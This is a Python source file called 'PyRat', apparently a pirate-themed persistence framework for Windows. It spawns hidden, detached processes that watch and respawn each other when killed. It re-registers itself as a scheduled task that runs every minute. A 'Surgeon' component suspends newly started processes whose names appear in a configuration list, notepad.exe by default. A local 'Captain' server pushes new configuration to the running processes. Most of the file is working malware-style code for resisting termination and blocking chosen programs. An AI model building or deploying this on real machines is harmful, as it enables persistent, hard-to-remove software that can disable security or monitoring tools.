import os
import sys
import time
import json
import socket
import ctypes
import psutil
import struct
import select
import base64
import signal
import subprocess
from io import StringIO
from abc import ABC, abstractmethod

ANY                 = "0.0.0.0"
LOCALHOST           = "localhost"
SOMAXCONN           = 128

PYRAT_TYPE_INDEX    = 1

STDOUT              = 0

def str2bool(string):
    if string == "True":
        return True
    else:
        return False

class PyRatError(Exception):
    pass

class PyRat(ABC):
    PYRAT_CODE                  = os.path.abspath(__file__)
    CREATION_FLAGS              = subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
    DEFAULT_CONFIG_FILE         = "config.json"

    SEND_RECV_DELAY             = 0.001
    CAPTAIN_PORT                = 0x4261 # ARG!

    def sail(self):
        try:
            self.operate()
        except KeyboardInterrupt:
            pass

        self.leave()

    @abstractmethod
    def operate(self):
        pass
    
    @abstractmethod
    def leave(self):
        pass

    def getConfiguration(self):
        configuration_data = self.getConfigurationData()

        json_io = StringIO(configuration_data.decode("utf-8"))
        return json.load(json_io)

    def getConfigurationData(self):
        try:
            with open(self.DEFAULT_CONFIG_FILE, "rb") as configuration_file:
                return configuration_file.read()

        except FileNotFoundError:
            return b""

    def challengeResponse(self, connection):
        sent_chal, recv_chal = self.sendAndRecvChallenge(connection)
        sent_resp, recv_resp = self.sendAndRecvResponse(connection, recv_chal)

        if not self.checkChallengeResponse(sent_chal, recv_resp):
            return False

        return True

    def sendAndRecvChallenge(self, connection):
        CHALLENGE = b"Arrrrg?"

        connection.send(CHALLENGE)
        time.sleep(self.SEND_RECV_DELAY) # The connection can crash if we don't wait ¯\_(ツ)_/¯
        other_challenge = connection.recv(len(CHALLENGE))

        return (CHALLENGE, other_challenge)

    def sendAndRecvResponse(self, connection, received_challenge):
        RESPONSE = b"Arrrrg!"

        connection.send(RESPONSE)
        time.sleep(self.SEND_RECV_DELAY) # The connection can crash if we don't wait ¯\_(ツ)_/¯
        other_response = connection.recv(len(RESPONSE))

        return (RESPONSE, other_response)

    def checkChallengeResponse(self, challenge, response):
        if response == b"Arrrrg!":
            return True

        return False

    def sendAndRecvPid(self, connection):
        connection.send(struct.pack(">L", os.getpid()))
        time.sleep(self.SEND_RECV_DELAY) # The connection can crash if we don't wait ¯\_(ツ)_/¯
        raw_pid = connection.recv(len(struct.pack(">L", 0)))
        return struct.unpack(">L", raw_pid)[0]

class Captain(PyRat):
    def __init__(self):
        self.connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection_socket.bind((ANY, self.CAPTAIN_PORT))
        self.connection_socket.listen(SOMAXCONN)

    def operate(self):
        configuration_data = self.getConfigurationData()

        while True:
            quartermaster_socket, quartermaster_address = self.connection_socket.accept()
            print(f"Got a new quartermaster: {quartermaster_address}")

            if self.challengeResponse(quartermaster_socket):
                quartermaster_socket.send(configuration_data)
                quartermaster_socket.close()

    def leave(self):
        self.connection_socket.close()

class Quartermaster(PyRat):
    QUARTERMASTER_EXE_PATH          = os.path.join(os.path.dirname(PyRat.PYRAT_CODE), "Quartermaster.exe")
    STORM_PATH                      = os.path.dirname(PyRat.PYRAT_CODE) + "\\storm"
    CAPTAIN_IP                      = "127.0.0.1"
    BLOCK_SIZE                      = 1024

    @staticmethod
    def generateInstance(challenges_socket = None):
        if challenges_socket is None:
            return psutil.Popen(
                [Quartermaster.QUARTERMASTER_EXE_PATH, PyRat.PYRAT_CODE, Quartermaster.__name__, "False"], 
                creationflags=PyRat.CREATION_FLAGS,
                close_fds = True)
        
        quatermaster = psutil.Popen(
            [Quartermaster.QUARTERMASTER_EXE_PATH, PyRat.PYRAT_CODE, Quartermaster.__name__, "True"], 
            stdin=subprocess.PIPE, 
            creationflags=PyRat.CREATION_FLAGS,
            close_fds = True)

        try:
            shared_challenges_socket = challenges_socket.share(quatermaster.pid)
            quatermaster.communicate(input=base64.b64encode(shared_challenges_socket), timeout=0)

        except subprocess.TimeoutExpired:
            pass

        return quatermaster

    def __init__(self, is_challenges_socket_in_input = "False"):
        self.new_configuration = False
        self.configuration = self.getConfiguration()

        self.challenges_socket = self.getChallengesSocket(str2bool(is_challenges_socket_in_input))
        if self.challenges_socket is None:
            exit(1)

        self.challenges_socket.setblocking(0)
        self.mates_pids = set()
        self.surgeon_pid = None
        
        print(f"A new quartermaster has been appointed! ({os.getpid()})")

    def operate(self):
        if self.isThereAStorm():
            return

        self.appointNewMates(self.configuration["NEW_QUARTERMASTER_MATES"])
        self.surgeon_pid = self.appointSurgeon(Surgeon.MODE_REMOVE)

        iteration = 0

        while not self.isThereAStorm():
            current_pids = psutil.pids()
            self.watchMates(current_pids)
            self.watchBoatswains()
            self.watchSurgeon(current_pids)
            self.acceptChallengingMates()

            time.sleep(self.configuration["ITERATION_DELAY"])

    def leave(self):
        self.dismissCrew()

        if self.challenges_socket is not None:
            self.challenges_socket.close()

        print(f"The quartermaster has left the ship. ({os.getpid()})")

    def getConfigurationData(self):
        last_configuration_data = PyRat.getConfigurationData(self)

        try:
            configuration_data = self.getConfigurationFromCaptain()

            if configuration_data != last_configuration_data:
                self.saveConfiguration(configuration_data)
                self.new_configuration = True

        except (socket.timeout, ConnectionRefusedError, PyRatError):
            configuration_data = last_configuration_data

        return configuration_data

    def getConfigurationFromCaptain(self):
        configuration_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        configuration_socket.settimeout(0.1) # To make the connection failure faster
        configuration_socket.connect((self.CAPTAIN_IP, self.CAPTAIN_PORT))

        if not self.challengeResponse(configuration_socket):
            raise PyRatError("The captain doesn't seem to respond well to the challenge")

        last_configuration_length = 0
        configuration_data = configuration_socket.recv(self.BLOCK_SIZE)
        while last_configuration_length != len(configuration_data):
            last_configuration_length = len(configuration_data)
            configuration_data += configuration_socket.recv(self.BLOCK_SIZE)

        return configuration_data

    def saveConfiguration(self, configuration_data):
        with open(self.DEFAULT_CONFIG_FILE, "wb") as configuration_file:
            configuration_file.write(configuration_data)

    def getChallengesSocket(self, is_challenges_socket_in_input = False):
        try:
            if not is_challenges_socket_in_input:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.bind((LOCALHOST, self.configuration["QUARTERMASTER_PORT"]))
                sock.listen(SOMAXCONN)
                return sock

        except Exception:
            return None

        challenges_socket_base64 = input()
        shared_challenges_socket = base64.b64decode(challenges_socket_base64)
        return socket.fromshare(shared_challenges_socket)

    def acceptChallengingMates(self):
        try:
            while True:
                # Will raise BlockingIOError if none waiting
                new_connection, _ = self.challenges_socket.accept()

                # Check if the one that was connected is a Mate
                if not self.challengeResponse(new_connection):
                    new_connection.close()
                    continue

                mate_pid = self.sendAndRecvPid(new_connection)
                new_connection.close()

                if self.new_configuration:
                    # Resetting the mate so it will get the new configuration
                    self.sendLeaveCommand(mate_pid)
                    self.appointNewMates(1)

                else:
                    self.mates_pids.add(mate_pid)

        except BlockingIOError:
            pass

    def watchMates(self, current_pids):
        mates_died = self.mates_pids - self.mates_pids.intersection(current_pids)
        
        for pid in mates_died:
            print(f"A mate has died! ({pid})")
            self.mates_pids.remove(pid)
        
        if mates_died:
            self.appointNewMates(self.configuration["DEAD_MATE_MATES"] * len(mates_died))

    def appointNewMates(self, number_of_new_mates):
        for i in range(number_of_new_mates):
            new_mate = Mate.generateInstance(os.getpid())
            self.mates_pids.add(new_mate.pid)

    def watchBoatswains(self):
        if not self.isScheduleBoatswainExists():
            self.appointScheduleBoatswain()

    def isScheduleBoatswainExists(self):
        check_if_schedule_boatswain_exists_command = \
            f'schtasks /Query /TN "{self.configuration["SCHEDULED_TASK_BOATSWAIN_NAME"]}" 2> nul'

        is_schedule_boatswain_exists = subprocess.Popen(check_if_schedule_boatswain_exists_command, 
                                                        shell=True, 
                                                        stdout=subprocess.PIPE).communicate()[STDOUT]
        return bool(is_schedule_boatswain_exists)

    def appointScheduleBoatswain(self):
        create_schedule_boatswain_task_command = \
            f'schtasks /Create /F /SC MINUTE /MO 1 /NP /TN "{self.configuration["SCHEDULED_TASK_BOATSWAIN_NAME"]}" /TR "{self.QUARTERMASTER_EXE_PATH} {PyRat.PYRAT_CODE}" >nul 2>nul'
        subprocess.Popen(create_schedule_boatswain_task_command, shell=True)

        print(f'A schedule boatswain has been appointed! (Scheduled task {self.configuration["SCHEDULED_TASK_BOATSWAIN_NAME"]})')

    def watchSurgeon(self, current_pids):
        if self.surgeon_pid not in current_pids:
            print(f"The surgeon has died! ({self.surgeon_pid})")
            self.surgeon_pid = self.appointSurgeon(Surgeon.MODE_REMOVE)

    def appointSurgeon(self, surgeon_mode):
        return Surgeon.generateInstance(os.getpid(), surgeon_mode).pid

    def isThereAStorm(self):
        if os.path.exists(self.STORM_PATH):
            print(f"Detected a storm... Today we shall not sail...")
            return True

        return False

    def dismissCrew(self):
        self.dismissBoatswains()
        self.dismissAllMates()
        self.dismissSurgeon()

    def dismissAllMates(self):
        for pid in self.mates_pids:
            self.sendLeaveCommand(pid)

    def dismissBoatswains(self):
        self.dismissScheduleBoatswain()

    def dismissScheduleBoatswain(self):
        delete_schedule_boatswain_task_command = \
            f'schtasks /Delete /F /TN "{self.configuration["SCHEDULED_TASK_BOATSWAIN_NAME"]}" >nul 2>nul'

        subprocess.Popen(delete_schedule_boatswain_task_command, shell=True)
        print(f'A schedule boatswain has left the ship. (Scheduled task {self.configuration["SCHEDULED_TASK_BOATSWAIN_NAME"]})')

    def dismissSurgeon(self):
        # Closing the surgeon and reattaching all the suspended processes by appointing a reattaching surgeon.
        self.sendLeaveCommand(self.surgeon_pid)
        self.appointSurgeon(Surgeon.MODE_REATTACH)

    def sendLeaveCommand(self, pid):
        try:
            os.kill(pid, signal.SIGINT)

        except (PermissionError, OSError):
            print("Permission error")
            pass

class Mate(PyRat):
    MATE_EXE_PATH               = os.path.join(os.path.dirname(PyRat.PYRAT_CODE), "Mate.exe")

    @staticmethod
    def generateInstance(quartermaster_pid = None):
        if quartermaster_pid is not None:
            return psutil.Popen(
                [Mate.MATE_EXE_PATH, PyRat.PYRAT_CODE, Mate.__name__, str(quartermaster_pid)], 
                creationflags=PyRat.CREATION_FLAGS,
                close_fds = True)
        else:
            return psutil.Popen(
                [Mate.MATE_EXE_PATH, PyRat.PYRAT_CODE, Mate.__name__], 
                creationflags=PyRat.CREATION_FLAGS,
                close_fds = True)

    def __init__(self, quartermaster_pid = None):
        self.configuration = self.getConfiguration()

        if quartermaster_pid is not None:
            self.quartermaster_pid = int(quartermaster_pid)
        else:
            self.quartermaster_pid = self.getQuartermasterPid()

        print(f"A new mate has joined the team! ({os.getpid()})")

    def operate(self):
        while True:
            if self.quartermaster_pid not in psutil.pids():
                self.tryToAppointNewQuartermaster()

            time.sleep(self.configuration["ITERATION_DELAY"])

    def leave(self):
        print(f"A mate has left the ship. ({os.getpid()})")

    def tryToAppointNewQuartermaster(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            sock.bind((LOCALHOST, self.configuration["QUARTERMASTER_PORT"]))

        except OSError:
            # There is another quartermaster. Becoming quartermaster failed!
            sock.close()
            self.quartermaster_pid = self.getQuartermasterPid()
            return

        # Only one Mate will be able to reach this line (we use the bind as a mutex).
        print(f"The quartermaster has died! ({self.quartermaster_pid})")
        sock.listen(SOMAXCONN)
        Quartermaster.generateInstance(sock)
        sock.close()

        self.quartermaster_pid = self.getQuartermasterPid()

    def getQuartermasterPid(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as connection:
            try:
                connection.connect((LOCALHOST, self.configuration["QUARTERMASTER_PORT"]))

            except ConnectionRefusedError:
                raise PyRatError("There is no quartermaster!")

            if not self.challengeResponse(connection):
                # The port is taken but it is not a quartermaster on the other side...
                raise PyRatError("A non quartermaster has taken the port!")

            return self.sendAndRecvPid(connection)

class Surgeon(PyRat):
    SURGEON_EXE_PATH    = os.path.join(os.path.dirname(PyRat.PYRAT_CODE), "Surgeon.exe")
    BAD_PROCESS_NAMES   = ["notepad.exe"]
    SUSPENDED           = "stopped"

    MODE_REMOVE         = "remove"
    MODE_REATTACH       = "reattach"

    @staticmethod
    def generateInstance(quartermaster_pid, mode):
        return psutil.Popen(
            [Surgeon.SURGEON_EXE_PATH, PyRat.PYRAT_CODE, Surgeon.__name__, str(quartermaster_pid), mode], 
            creationflags=PyRat.CREATION_FLAGS,
            close_fds = True)

    def __init__(self, quartermaster_pid, mode):
        self.configuration = self.getConfiguration()

        if mode not in [self.MODE_REMOVE, self.MODE_REATTACH]:
            raise PyRatError("Not a valid surgeon mode")

        self.quartermaster_pid = int(quartermaster_pid)
        self.mode = mode
        self.start_time = time.time()

        print(f"A new surgeon has joined the team! ({os.getpid()})")

    def operate(self):
        if self.mode == self.MODE_REMOVE:
            while self.quartermaster_pid in psutil.pids():
                self.removeLimbs()
                time.sleep(self.configuration["ITERATION_DELAY"])
        
        elif self.mode == self.MODE_REATTACH:
            self.reattachLimbs()

    def leave(self):
        print(f"The surgeon has left the ship. ({os.getpid()})")

    def removeLimbs(self):
        for process in psutil.process_iter():
            if process.name() in self.configuration["BAD_PROCESSES_NAMES"] and \
               process.create_time() > self.start_time and \
               process.status() != self.SUSPENDED:

                process.suspend()

    def reattachLimbs(self):
        for process in psutil.process_iter():
            if process.name() in self.configuration["BAD_PROCESSES_NAMES"] and \
               process.status() == self.SUSPENDED:
               
                process.resume()

def main(argv):
    if len(argv) <= PYRAT_TYPE_INDEX:
        # This is the main run. We want to create a Quartermaster and exit.
        Quartermaster.generateInstance()
        return

    try:
        # Generating the wanted PyRat
        pyrat = globals()[argv[PYRAT_TYPE_INDEX]](*argv[PYRAT_TYPE_INDEX + 1 :])
        pyrat.sail()

    except KeyboardInterrupt:
        pass

    except Exception as e:
        ctypes.windll.user32.MessageBoxW(0, "An unexpected exception was raised:\n{}".format(e), "A PyRat fell", 0)

if __name__ == "__main__":
    main(sys.argv)
